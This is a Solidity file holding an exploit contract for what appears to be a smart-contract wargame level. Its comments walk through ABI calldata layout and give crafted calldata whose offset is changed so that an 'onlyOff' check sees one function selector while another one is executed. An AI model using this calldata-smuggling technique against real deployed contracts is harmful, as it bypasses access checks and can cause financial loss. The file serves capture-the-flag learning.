// SPDX-License-Identifier: MIT
pragma solidity^0.8.2;

interface ISwitch {
    function flipSwitch(bytes memory)external;
}

contract Attack{
    //passing this value as flipTheSwittch:
    //0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
    function attack(ISwitch theSwitch,bytes memory flipTheSwitch)external{
     /*
     *because of the modifier onlyOff from 68th byte 4 bytes have to be function selector of the turnSwitchOff() function
     *when we call mannualy (not from this contract) function flipSwitch() and pass it as a parmater a function selecotor of the function turnSwitchOff()
     *we can see that the calldata that is passed is equal to:
     *0x30c13ade0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000
     *where the first 4 bytes are function selector of the function flipSwitch()
     *next 32 bytes represents an offset which show us the location of the data 
     *in this example offset is 20 (hex) which is 32 in decimal, and that tells us that data starts after 32 bytes
     *data has two parts
     *1. size - tells us the size of the data
     *2. data - tells us what is the data value
     *
     *by modifying this byte code we would be able to pass this level
     *we modified offset so its point on the other location, and added one more data size and data (function selector of the function turnSwitchOn)
     *0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000
     */
     address(theSwitch).call(flipTheSwitch);
    
    }
}